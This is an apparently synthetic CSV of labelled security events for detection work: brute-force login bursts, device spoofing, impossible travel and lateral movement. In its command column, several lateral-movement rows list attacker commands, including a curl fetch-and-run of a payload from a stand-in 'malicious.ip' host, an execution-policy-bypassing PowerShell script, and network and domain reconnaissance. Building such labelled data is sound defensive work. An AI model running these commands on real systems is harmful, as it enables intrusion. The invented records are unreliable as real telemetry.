entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:45,111.44.151.42,"Port Lisastad, Hong Kong",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:46,111.44.151.42,"North Madison, French Guiana",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:53,111.44.151.42,"Lake Elizabeth, French Guiana",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:54,111.44.151.42,"Kingmouth, Mayotte",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:54,111.44.151.42,"Hardingstad, French Polynesia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:55,111.44.151.42,"Jenniferstad, Tajikistan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:55,111.44.151.42,"North Lisa, Bolivia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:48:57,111.44.151.42,"Lake Nathanhaven, Andorra",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:00,111.44.151.42,"East Jacob, Dominican Republic",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:04,111.44.151.42,"Lake Robert, French Southern Territories",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:05,111.44.151.42,"Port Shannon, Algeria",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:05,111.44.151.42,"New Jeremy, Antarctica (the territory South of 60 deg S)",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:06,111.44.151.42,"Lake Brianmouth, Lebanon",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:13,111.44.151.42,"East Amanda, Chad",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:13,111.44.151.42,"Hallview, Saudi Arabia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:15,111.44.151.42,"South Edwardtown, Martinique",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:18,111.44.151.42,"Courtneyhaven, Greenland",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:21,111.44.151.42,"New Lauramouth, Germany",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:35,111.44.151.42,"Amandachester, Western Sahara",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:39,111.44.151.42,"Port Mckenziefort, Vietnam",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:39,111.44.151.42,"Catherineville, Benin",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:47,111.44.151.42,"North Petershire, Netherlands",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:49,111.44.151.42,"Debraport, Zambia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:50,111.44.151.42,"South Gina, Uzbekistan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:49:51,111.44.151.42,"South Bobbytown, Jamaica",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:00,111.44.151.42,"Christinebury, Cyprus",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:10,111.44.151.42,"Christopherchester, Chile",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:13,111.44.151.42,"Kellyfort, Bahrain",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:29,111.44.151.42,"Lisatown, Cambodia",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:30,111.44.151.42,"Port Javier, Egypt",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:40,111.44.151.42,"East Robertfort, Palau",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:41,111.44.151.42,"Lopezshire, Tajikistan",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:50:45,111.44.151.42,"Port Shelbyfurt, Switzerland",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
1afe410c-a51d-4e15-9161-ae169b0dbe12,User,2026-06-25 15:51:25,111.44.151.42,"Victorfurt, Cook Islands",Email,Password,0,N/A,Unknown Script/Bot,False,BruteForce
59bdedb7-0a38-4760-83ca-8970fcaf1156,User,2026-06-25 15:55:32,20.8.20.198,"Kristyfurt, Bhutan",AWS Console,Password,1327,N/A,iOS 17 - Tor Browser - MAC: 88:ca:6f:64:ef:de,True,Device Spoofing
210455e3-1c47-4bff-b319-429f535e5841,Device,2026-06-25 16:31:02,53.42.143.147,"Seanshire, Cameroon",Confluence,SSO,2229,N/A,Unknown Browser/Device,True,Impossible Travel
325f72d6-3a2d-4ce0-94c8-f817c2982f9a,User,2026-06-25 16:38:43,1.186.196.70,"East Donaldton, Central African Republic",Jira,SSO,3072,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,Ubuntu 22.04 - Edge,True,Lateral Movement
325f72d6-3a2d-4ce0-94c8-f817c2982f9a,User,2026-06-25 16:40:43,1.186.196.70,"East Donaldton, Central African Republic",GitLab,SSO,1244,"arp -a -> wmic process call create ""cmd.exe /c set""",Ubuntu 22.04 - Edge,True,Lateral Movement
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:36,60.128.17.227,"South Mariah, Hungary",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:38,60.128.17.227,"Perryfort, Moldova",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:40,60.128.17.227,"Donnatown, Bermuda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:41,60.128.17.227,"Alexisside, North Macedonia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:41,60.128.17.227,"New Stephanie, Chad",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:42,60.128.17.227,"Danielfurt, Madagascar",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:47,60.128.17.227,"Mackenziechester, Qatar",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:50,60.128.17.227,"Port Keithville, Korea",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:54,60.128.17.227,"Lake Holly, Poland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:54,60.128.17.227,"Torresside, Bermuda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:22:59,60.128.17.227,"Porterview, Mali",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:00,60.128.17.227,"Andersonfort, Tokelau",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:03,60.128.17.227,"Kentbury, Saint Pierre and Miquelon",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:06,60.128.17.227,"Alishaland, Hungary",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:07,60.128.17.227,"Murphystad, Swaziland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:08,60.128.17.227,"Henryburgh, Burundi",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:21,60.128.17.227,"Beverlyhaven, Solomon Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:24,60.128.17.227,"New Brandy, New Caledonia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:28,60.128.17.227,"Hannahhaven, Angola",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:33,60.128.17.227,"Michaelchester, Iraq",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:34,60.128.17.227,"Murphyville, Fiji",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:42,60.128.17.227,"South Robertmouth, Norway",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:46,60.128.17.227,"Nguyenchester, Lithuania",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:23:56,60.128.17.227,"Jenniferstad, Algeria",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:01,60.128.17.227,"Medinaborough, Guam",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:12,60.128.17.227,"Port Ryan, Ireland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:16,60.128.17.227,"Freemanville, Isle of Man",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:20,60.128.17.227,"West Jeffrey, South Georgia and the South Sandwich Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:21,60.128.17.227,"Lake Charles, Bosnia and Herzegovina",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:28,60.128.17.227,"Myerschester, Chad",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:24:51,60.128.17.227,"Carsonborough, Congo",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:25:06,60.128.17.227,"Lake Lisa, Angola",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
81db3fba-6f0a-47c8-b94b-96cd16d5076a,User,2026-06-25 17:25:16,60.128.17.227,"South Jesse, Guyana",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
827f4df1-524a-45f5-ae6d-481c962238e0,User,2026-06-25 18:09:27,5.109.215.230,"Tannershire, Australia",Confluence,MFA,1028,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 11 - Edge,True,Lateral Movement
827f4df1-524a-45f5-ae6d-481c962238e0,User,2026-06-25 18:13:27,5.109.215.230,"Tannershire, Australia",Email,MFA,1775,"arp -a -> wmic process call create ""cmd.exe /c set""",Windows 11 - Edge,True,Lateral Movement
827f4df1-524a-45f5-ae6d-481c962238e0,User,2026-06-25 18:15:27,5.109.215.230,"Tannershire, Australia",Intranet,MFA,3771,whoami -> net user /domain -> nmap -sT 10.0.0.0/24,Windows 11 - Edge,True,Lateral Movement
9159f183-60d0-442f-b1e9-fb6f4786d41a,User,2026-06-25 18:53:39,178.166.147.151,"Tonytown, Netherlands Antilles",Jira,SSO,1417,N/A,Kali Linux - Brave - MAC: 6c:20:f1:2e:14:3b,True,Device Spoofing
bfa28380-2a92-4d21-83fb-e3d214c974b3,User,2026-06-26 06:26:03,182.118.33.101,"East Sean, Czech Republic",Confluence,Password,643,N/A,BlackArch - Curl - MAC: 48:0c:d9:1f:97:b7,True,Device Spoofing
9a5b6de1-7db7-4269-b2dd-0bcc031d3da4,Device,2026-06-26 06:44:12,50.50.102.194,"Pattersonfurt, Mayotte",Database,Password,1062,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,IoT Sensor,True,Lateral Movement
9a5b6de1-7db7-4269-b2dd-0bcc031d3da4,Device,2026-06-26 06:48:12,50.50.102.194,"Pattersonfurt, Mayotte",GitLab,Password,6311,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,IoT Sensor,True,Lateral Movement
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:32,175.41.54.141,"New James, Taiwan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:37,175.41.54.141,"Garzaview, Georgia",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:38,175.41.54.141,"North Angela, El Salvador",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:38,175.41.54.141,"Abigailberg, Lithuania",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:40,175.41.54.141,"East Steven, Azerbaijan",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:41,175.41.54.141,"New Jamieville, Malawi",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:43,175.41.54.141,"Francesstad, British Indian Ocean Territory (Chagos Archipelago)",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:46,175.41.54.141,"Transhire, Saint Helena",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:48,175.41.54.141,"Castilloview, Iceland",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:52,175.41.54.141,"Lopezbury, British Virgin Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:53,175.41.54.141,"Brownport, Luxembourg",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:48:57,175.41.54.141,"Robinburgh, British Virgin Islands",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:02,175.41.54.141,"New Josephshire, Sweden",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:08,175.41.54.141,"Sarabury, Brazil",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:11,175.41.54.141,"Dannyburgh, Cote d'Ivoire",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:17,175.41.54.141,"Adrianfort, Cape Verde",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:29,175.41.54.141,"Danielleberg, Moldova",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:36,175.41.54.141,"Jordanville, Dominica",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:42,175.41.54.141,"Paulahaven, Palau",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:44,175.41.54.141,"Kellyhaven, Aruba",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:49:57,175.41.54.141,"West Bettyhaven, El Salvador",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
79a28482-8af2-45f1-b8bc-fe4fefbcfcfe,User,2026-06-26 06:50:12,175.41.54.141,"South Karenborough, Montserrat",VPN,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:50,116.201.166.216,"North Alanberg, Oman",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:53,116.201.166.216,"Lindabury, French Southern Territories",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:54,116.201.166.216,"Davistown, Qatar",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:54,116.201.166.216,"New Robert, Hungary",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:57,116.201.166.216,"Mcintoshmouth, Ireland",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:02:58,116.201.166.216,"Parsonsburgh, Rwanda",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:00,116.201.166.216,"Mcdanielland, Norfolk Island",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:05,116.201.166.216,"Nataliefurt, Tanzania",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:06,116.201.166.216,"East Aaronbury, Cote d'Ivoire",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:08,116.201.166.216,"Wareburgh, Cameroon",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:10,116.201.166.216,"Campbellmouth, Aruba",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:10,116.201.166.216,"Sharonville, Korea",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:16,116.201.166.216,"North Heather, Italy",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:18,116.201.166.216,"North Alexanderport, Papua New Guinea",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:24,116.201.166.216,"Cruzville, Cuba",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:26,116.201.166.216,"West Nicholasfurt, Bahamas",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:34,116.201.166.216,"West Scottmouth, Bolivia",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:34,116.201.166.216,"Port Trevorhaven, Iceland",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:38,116.201.166.216,"South Jasonfort, Liechtenstein",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:03:50,116.201.166.216,"Danielshire, French Southern Territories",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:04:02,116.201.166.216,"Bradleyside, Gibraltar",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:04:06,116.201.166.216,"West Carrie, Taiwan",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:04:14,116.201.166.216,"South Nicolasmouth, Cape Verde",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c2b75eda-5434-47e2-810a-8b82431c7a59,User,2026-06-26 08:04:45,116.201.166.216,"Edwardsborough, Jordan",Intranet,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:06,197.130.46.119,"Matthewville, Antigua and Barbuda",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:07,197.130.46.119,"Craigberg, Albania",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:12,197.130.46.119,"North Anthonyfurt, Argentina",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:13,197.130.46.119,"New Roberto, Antigua and Barbuda",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:16,197.130.46.119,"Adrianland, Uruguay",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:18,197.130.46.119,"Port Marissahaven, Sierra Leone",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:21,197.130.46.119,"West Jessicaland, Monaco",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:22,197.130.46.119,"Port Victoria, Equatorial Guinea",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:24,197.130.46.119,"Theodoremouth, Israel",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:26,197.130.46.119,"Dennisborough, Botswana",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:28,197.130.46.119,"Lake Donnaton, Japan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:28,197.130.46.119,"North Scottport, Norfolk Island",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:30,197.130.46.119,"New Annahaven, Antigua and Barbuda",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c137b9a2-ca4e-4162-b808-090b9d2e0df2,User,2026-06-26 08:13:34,197.130.46.119,"Port Linda, Congo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
f5284e4c-85a9-4f07-a54d-16475a12efbc,User,2026-06-26 08:13:35,159.196.24.25,"Port Megantown, Korea",GitLab,Password,0,N/A,Unknown Script/Bot,False,BruteForce
